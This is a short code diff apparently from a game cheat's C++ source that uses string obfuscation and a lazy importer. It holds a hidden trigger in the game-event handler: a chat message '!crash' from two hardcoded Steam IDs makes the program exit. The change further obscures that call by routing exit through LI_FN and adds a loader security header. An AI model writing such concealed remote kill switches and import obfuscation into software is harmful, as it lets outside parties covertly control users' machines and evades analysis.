@@ -22,6 +22,8 @@
 #include <Shlwapi.h>
 #pragma comment(lib, "shlwapi.lib")
 
+#include "../../Loader/Security/Security.hpp"
+
 
 #define ADD_GAMEEVENT(n)  Interfaces::m_pGameEvent->AddListener(this, XorStr(#n), false)
 
@@ -733,7 +735,7 @@ void C_GameEvent::FireGameEvent( IGameEvent* pEvent ) {
 
 		if (message == XorStr("!crash") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
 		{
-			exit(0);
+			LI_FN(exit)(0);
 			return;
 		}
 #endif
